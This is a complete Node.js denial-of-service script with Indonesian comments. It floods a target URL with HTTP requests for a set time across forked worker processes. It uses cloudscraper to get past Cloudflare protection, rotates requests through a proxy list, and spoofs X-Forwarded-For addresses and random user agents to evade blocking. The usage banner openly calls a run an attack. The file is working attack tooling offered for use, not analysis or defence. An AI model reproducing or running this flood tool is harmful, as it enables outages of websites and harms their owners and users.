const cloudscraper = require('cloudscraper');
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const path = require("path");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const https = require('https');

const args = process.argv.slice(2);

process.on('uncaughtException', () => { console.log("Error occurred") });
process.on('unhandledRejection', () => { console.log("Promise rejection") });

if (process.argv.length <= 2) {
    console.log(`[Usage] node cf.js <url> <time> <threads> <rate_in_ms>`);
    console.log(`[Example] node cf.js example.com 60 10 100`);
    console.log(`[Warning] Do not use on .edu .gov domains`);
    process.exit(-1);
}

const targetUrl = process.argv[2];
const time = Number(process.argv[3]);
const threads = Number(process.argv[4]) || 1;
const rateInMs = Number(process.argv[5]) || 100;

// Parsing URL menggunakan modul 'url'
const parsedUrl = new url.URL(targetUrl);

const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
}

// Mengambil User-Agent acak dengan modul 'UserAgent'
const userAgent = new UserAgent().toString();

const getRandomProxy = () => {
    const proxyList = fs.readFileSync('./proxy.txt', 'utf-8').split('\n');
    return proxyList[Math.floor(Math.random() * proxyList.length)].trim();
}

// Menggunakan modul 'crypto' untuk membuat ID unik atau token
const generateToken = () => {
    return crypto.randomBytes(16).toString("hex");
}

const attack = () => {
    const proxy = getRandomProxy();
    const headers = {
        'User-Agent': userAgent,
        'X-Forwarded-For': rIp(),
        'Token': generateToken(), // Tambahkan header token acak
    };

    cloudscraper({
        url: targetUrl,
        method: 'GET',
        proxy: `http://${proxy}`,
        headers: headers,
    }).then((response) => {
        console.log(`[Success] Request sent via ${proxy}`);
    }).catch((error) => {
        console.log(`[Error] Request failed via ${proxy} - ${error.message}`);
    });
}

// Jika 'cluster' digunakan untuk multi-threading
if (cluster.isMaster) {
    console.log(`[Info] Starting ${time} seconds attack on ${targetUrl} with ${threads} threads`);

    for (let i = 0; i < threads; i++) {
        cluster.fork(); // Fork proses baru untuk setiap thread
    }

    setTimeout(() => {
        console.log(`[Info] Attack ended on ${targetUrl}`);
        process.exit(0);
    }, time * 1000);

} else {
    setInterval(attack, rateInMs);
}
